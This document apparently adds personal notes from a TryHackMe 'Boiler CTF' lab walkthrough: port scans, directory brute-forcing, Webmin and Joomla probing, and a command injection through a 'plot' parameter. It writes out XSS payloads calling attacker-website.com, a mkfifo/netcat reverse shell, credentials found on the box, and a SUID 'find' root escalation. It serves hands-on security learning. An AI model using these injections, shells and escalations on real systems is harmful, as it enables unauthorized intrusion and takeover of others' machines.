@@ -1,0 +1,391 @@
+Name: Boiler CTF
+Date: 06/03/2022
+Difficulty: Medium
+Description: Intermediate level CTF
+Better Description: MrSeth is Troll
+Goals: To find my weaknesses: where do I hit chokepoints of method? Method - Time myself, be natural - not strict.
+Learnt: ! This was a very eye opener box!
+What I learnt: 
+Seperate out my goals
+State goals at the beginning of these notes: Add honest goals and what I learn to each upload - add template in readme. 
+My need to blind more boxes so I can improve my divide and conqueor recursion over my finding.
+Got to setup multiple screens to see more things.
+Brave the search engine more, with some parts of web exploitation, 
+Brave throwing stuff at the site, I could not find version to then be more precise in find exploits,
+Make priority list for things to find machines agnostic 
+TEST MY suidBinChecker.sh Today!
+
+
+root@ip-10-10-150-89:~# nmap -sC -sV -T 4 -p- 10.10.155.67
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-01-20 11:21 GMT
+Nmap scan report for ip-10-10-155-67.eu-west-1.compute.internal (10.10.155.67)
+Host is up (0.00077s latency).
+Not shown: 65531 closed ports
+PORT      STATE SERVICE VERSION
+21/tcp    open  ftp     vsftpd 3.0.3
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.150.89
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
+|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
+|_  256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (EdDSA)
+MAC Address: 02:24:A7:B1:00:23 (Unknown)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 272.34 seconds
+
+root@ip-10-10-150-89:~# nikto -h 10.10.71.33
+- Nikto v2.1.5
+---------------------------------------------------------------------------
++ Target IP:          10.10.71.33
++ Target Hostname:    ip-10-10-71-33.eu-west-1.compute.internal
++ Target Port:        80
++ Start Time:         2022-01-20 11:48:12 (GMT0)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
++ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80 
++ OSVDB-3233: /icons/README: Apache default file found.
++ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host
++ End Time:           2022-01-20 11:48:22 (GMT0) (10 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+
+root@ip-10-10-150-89:~# gobuster dir -u http://10.10.155.67 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.155.67
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2022/01/20 11:21:45 Starting gobuster
+===============================================================
+/manual (Status: 301)
+/joomla (Status: 301)
+/server-status (Status: 403)
+===============================================================
+2022/01/20 11:22:09 Finished
+===============================================================
+root@ip-10-10-150-89:~# gobuster dir -u http://10.10.155.67 -w /usr/share/wordlists/dirb/common.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.155.67
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2022/01/20 11:44:06 Starting gobuster
+===============================================================
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/index.html (Status: 200)
+/joomla (Status: 301)
+/manual (Status: 301)
+/robots.txt (Status: 200)
+/server-status (Status: 403)
+===============================================================
+2022/01/20 11:44:06 Finished
+===============================================================
+
+
+# Lesson learnt, use ls -la  on FTP instead of just ls. 
+
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+226 Directory send OK.
+ftp> ls -la
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
+drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
+-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
+226 Directory send OK.
+
+# https://www.boxentriq.com/code-breaking/vigenere-cipher
+Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
+39919   nnn     just wanted to see if you find it lol remember enumeration is the keyo
+
+
+root@ip-10-10-189-107:~# nmap --script exploit -p 10000 10.10.246.234
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-03-06 09:53 GMT
+Nmap scan report for ip-10-10-246-234.eu-west-1.compute.internal (10.10.246.234)
+Host is up (0.00020s latency).
+
+PORT      STATE SERVICE
+10000/tcp open  snet-sensor-mgmt
+MAC Address: 02:3F:34:24:EA:D5 (Unknown)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.49 seconds
+
+root@ip-10-10-189-107:~# nmap --script discovery -p 10000 10.10.246.234
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-03-06 09:54 GMT
+Pre-scan script results:
+| targets-asn: 
+|_  targets-asn.asn is a mandatory parameter
+Nmap scan report for ip-10-10-246-234.eu-west-1.compute.internal (10.10.246.234)
+Host is up (0.00026s latency).
+
+PORT      STATE SERVICE
+10000/tcp open  snet-sensor-mgmt
+MAC Address: 02:3F:34:24:EA:D5 (Unknown)
+
+Host script results:
+| dns-brute: 
+|   DNS Brute-force hostnames: 
+|_    ns0.eu-west-1.compute.internal - 172.16.0.23
+|_fcrdns: PASS (ip-10-10-246-234.eu-west-1.compute.internal)
+|_ipidseq: Randomized
+|_path-mtu: PMTU == 9001
+
+Nmap done: 1 IP address (1 host up) scanned in 33.56 seconds
+
+
+root@ip-10-10-189-107:~# nikto -h 10.10.246.234:10000
+- Nikto v2.1.5
+---------------------------------------------------------------------------
++ Target IP:          10.10.246.234
++ Target Hostname:    ip-10-10-246-234.eu-west-1.compute.internal
++ Target Port:        10000
++ Start Time:         2022-03-06 09:54:09 (GMT0)
+---------------------------------------------------------------------------
++ Server: MiniServ/1.930
++ The anti-clickjacking X-Frame-Options header is not present.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
++ MiniServ - This is the Webmin Unix administrator. It should not be running unless required.
++ 6544 items checked: 0 error(s) and 3 item(s) reported on remote host
++ End Time:           2022-03-06 09:56:47 (GMT0) (158 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+grep -e "Webmin" /usr/share/wordlists/SecLists/Passwords/Default-Credentials/default-passwords.csv
+Webmin,admin,hp.com, 
+
+# default password has changed
+
+# To practice Curl and just in case we need to bruteforce the login page, but primarily to grep for version information:
+
+curl https://ip-10-10-246-234.eu-west-1.compute.internal:10000/session_login.cgi -k -o webminpage.html
+
+# Even though the answer is nay I thought that I might try explore if I could find a way to xss to reverse shell
+# I gave myself 20 minutes for this "distraction-route" for fun and profit
+# This section is stumble around researching stuff, feel free to skip to line number:
+
+# Scanned with ZAP
+CSP wildcard directive
+Evidence: script-src 'self' 'unsafe-inline' 'unsafe-eval'; frame-src 'self'; child-src 'self'
+https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass#file-upload-+-self
+
+Content-Security-Policy: script-src 'self' https://google.com https: data *; 
+
+"/>'><script src=https://attacker-website.com/evil.js></script>
+"/>'><script src=data:text/javascript,alert(1337)></script>
+
+https://www.hackingarticles.in/cross-site-scripting-exploitation/
+
+
+# Continuing on the more thm room defined path...
+$IP:80/robot.txt
+User-agent: *
+Disallow: /
+
+/tmp
+/.ssh
+/yellow
+/not
+/a+rabbit
+/hole
+/or
+/is
+/it
+
+079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075]
+
+The encoded stuff is probably another troll
+
+# The directories listed are a rabbit-hole
+# make list with the contents modify this script:
+# remove "/" before $WORD
+https://github.com/7RU7H/AllTheHackingScripts/blob/main/bash/curlBrute.sh
+# Or use gobuster..
+# I made it to practice some bash
+
+# Looked at https://github.com/kurohat/writeUp/blob/master/TryHackMe/Medium/BoilerCTF.md
+# I sharp reminder of my need to sharpen my methodology of look back at notes
+# Returned to looking back at joomla
+
+# From the HaJoker Room there should be an /administrator/ directory
+
+root@ip-10-10-189-107:~# gobuster dir -u http://10.10.246.234/joomla/ -w /usr/share/wordlists/dirb/big.txt -x pl
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.246.234/joomla/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     pl
+[+] Timeout:        10s
+===============================================================
+2022/03/06 11:12:04 Starting gobuster
+===============================================================
+/.htaccess (Status: 403)
+/.htaccess.pl (Status: 403)
+/.htpasswd (Status: 403)
+/.htpasswd.pl (Status: 403)
+/_archive (Status: 301)
+/_database (Status: 301) # another Lwuv oguukpi ctqwpf.
+/_files (Status: 301) # contains VjJodmNITnBaU0JrWVdsemVRbz0K - probably another trolly time shink
+/_test (Status: 301)
+/administrator (Status: 301)
+/bin (Status: 301)
+/build (Status: 301)
+/cache (Status: 301)
+/cli (Status: 301)
+/components (Status: 301)
+/images (Status: 301)
+/includes (Status: 301)
+/installation (Status: 301)
+/language (Status: 301)
+/layouts (Status: 301)
+/libraries (Status: 301)
+/media (Status: 301)
+/modules (Status: 301)
+/plugins (Status: 301)
+/templates (Status: 301)
+/tests (Status: 301)
+/tmp (Status: 301)
+/~www (Status: 301) # Mnope, nothin to see.
+===============================================================
+2022/03/06 11:12:08 Finished
+===============================================================
+root@ip-10-10-189-107:~# 
+
+http://10.10.246.234/joomla/_test/index.php?plot=NEW # you upload a file
+
+# Read https://github.com/kurohat/writeUp/blob/master/TryHackMe/Medium/BoilerCTF.md
+# 
+
+https://www.exploit-db.com/exploits/47204
+
+http://10.10.82.89/joomla/_test/index.php?plot=;which%20nc
+Go the "Select Host" Drop down 
+
+tried:
+python -c 'import os; os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.142.54 11111 >/tmp/f")' 
+"ls"ed around to find directories with lfi.
+locate works
+# locate ???.??? sort of works
+Did not ls in foothold directory:
+log.txt -> cat log.txt 
+Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$
+
+# I have ideas but sometimes CTF low-hanging fruit is weird, but I need to look for log files, conf file moreand be more methodical about manual searchign through directories. 
+
+basterd@Vulnerable:~$ cat backup.sh
+REMOTE=1.2.3.4
+
+SOURCE=/home/stoner
+TARGET=/usr/local/backup
+
+LOG=/home/stoner/bck.log
+ 
+DATE=`date +%y\.%m\.%d\.`
+
+USER=stoner
+#superduperp@$$no1knows
+
+ssh $USER@$REMOTE mkdir $TARGET/$DATE
+
+
+if [ -d "$SOURCE" ]; then
+    for i in `ls $SOURCE | grep 'data'`;do
+             echo "Begining copy of" $i  >> $LOG
+             scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE
+             echo $i "completed" >> $LOG
+
+                if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
+                    rm $SOURCE/$i
+                    echo $i "removed" >> $LOG
+                    echo "####################" >> $LOG
+                                else
+                                        echo "Copy not complete" >> $LOG
+                                        exit 0
+                fi 
+    done
+     
+
+else
+
+    echo "Directory is not present" >> $LOG
+    exit 0
+fi
+
+
+# The vain of trying to be more methodically
+# Also run the backup.ss as echo >> log=/home/stoner/bak.log, just in case
+su stoner
+ls -la  /home/stoner
+.secret = user.txt
+
+
+stoner@Vulnerable:~$ sudo -l
+User stoner may run the following commands on Vulnerable:
+    (root) NOPASSWD: /NotThisTime/MessinWithY
+
+# I DID NOT EVEN USE my suidGTFobins script to test! AAAAARARAFGH
+
+stoner@Vulnerable:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+-r-sr-xr-x 1 root root 232196 Feb  8  2016 /usr/bin/find
+./find . -exec /bin/sh -p \; -quit
+# id
+uid=1000(stoner) gid=1000(stoner) euid=0(root) groups=1000(stoner),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+# cat /root/root.txt
+It wasn't that hard, was it?
+# exit
+
+In conclusion:
+This was the kneecapping I needed to "find" some ways to improve :)
+                                                                     
